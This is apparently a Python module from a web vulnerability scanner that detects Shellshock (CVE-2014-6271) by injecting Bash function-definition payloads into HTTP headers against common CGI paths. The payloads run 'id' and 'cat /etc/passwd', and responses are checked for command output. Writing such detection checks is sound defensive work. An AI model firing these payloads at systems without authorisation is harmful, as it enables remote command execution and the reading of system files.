"""Shellshock — CVE-2014-6271 / CVE-2014-7169 via HTTP headers."""
from typing import List
from scanner.core.crawler import CrawlResult
from scanner.core.scan_result import Finding, Severity

_PAYLOAD = "() { :; }; echo Content-Type: text/plain; echo; "
_CMD_PAYLOADS = [
    _PAYLOAD + "id",
    _PAYLOAD + "cat /etc/passwd",
    _PAYLOAD + "echo KageSec-Shellshock",
]

_HEADERS_TO_TEST = [
    "User-Agent",
    "Referer",
    "Cookie",
    "X-Forwarded-For",
    "Accept-Language",
    "Accept-Encoding",
]

_CGI_PATHS = [
    "/cgi-bin/test.cgi",
    "/cgi-bin/printenv.pl",
    "/cgi-bin/status",
    "/cgi-bin/env.cgi",
    "/cgi-bin/bash",
    "/cgi-bin/test-cgi",
    "/cgi-bin/php",
]

# Signatures that prove actual command execution (never appear in normal HTML pages)
_SIGNATURES = [
    "uid=",
    "gid=",
    "root:x:",
]

# Canary that only appears if our echo command actually ran
_CANARY = "KageSec-Shellshock-Confirmed"


def _is_real_execution(resp) -> str | None:
    """
    Return the matched signature only if the response looks like real CGI output,
    not a reflected User-Agent or HTML error page.

    Real Shellshock output:
      - Content-Type: text/plain  (set by our injected echo)
      - Short body (not a full HTML page)
      - Contains command output tokens, NOT HTML tags
    """
    ct = resp.headers.get("content-type", "").lower()
    body = getattr(resp, "text", "")

    # If the response is HTML, it's a 404/error page — not real execution
    if "<html" in body.lower() or "<!doctype" in body.lower():
        return None

    # Require text/plain content-type (our injected header sets this)
    if "text/plain" not in ct:
        return None

    # Must be short — real CGI output is a few lines, not a full page
    if len(body) > 2000:
        return None

    return next((s for s in _SIGNATURES if s in body), None)


def test(page: CrawlResult, client) -> List[Finding]:
    from urllib.parse import urlparse
    parsed = urlparse(page.url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    findings = []
    for cgi_path in _CGI_PATHS:
        url = base + cgi_path
        for payload in _CMD_PAYLOADS:
            for header in _HEADERS_TO_TEST:
                try:
                    resp = client.get(url, headers={header: payload}, timeout=8)
                    matched = _is_real_execution(resp)
                    if matched:
                        findings.append(_finding(url, header, payload, matched))
                        return findings
                except Exception:
                    continue
    return findings


def _finding(url: str, header: str, payload: str, matched: str) -> Finding:
    return Finding(
        title="Shellshock — Bash Remote Code Execution (CVE-2014-6271)",
        severity=Severity.CRITICAL,
        url=url,
        parameter=header,
        payload=payload,
        evidence=f"Command output signature '{matched}' in response via header '{header}'",
        description=(
            "The Shellshock vulnerability allows remote attackers to execute arbitrary OS commands "
            "by injecting a specially crafted function definition into Bash environment variables "
            "passed through CGI requests. Full system compromise is possible."
        ),
        remediation=(
            "Upgrade Bash to 4.3 patch 25 or later on all systems. Disable CGI scripts that invoke "
            "Bash. If CGI is required, use a language-specific CGI handler rather than shell scripts."
        ),
        cwe="CWE-78",
        cvss=9.8,
        owasp_category="A06:2021 Vulnerable and Outdated Components",
        standards={"CVE": "CVE-2014-6271"},
        confidence=1.0,
    )
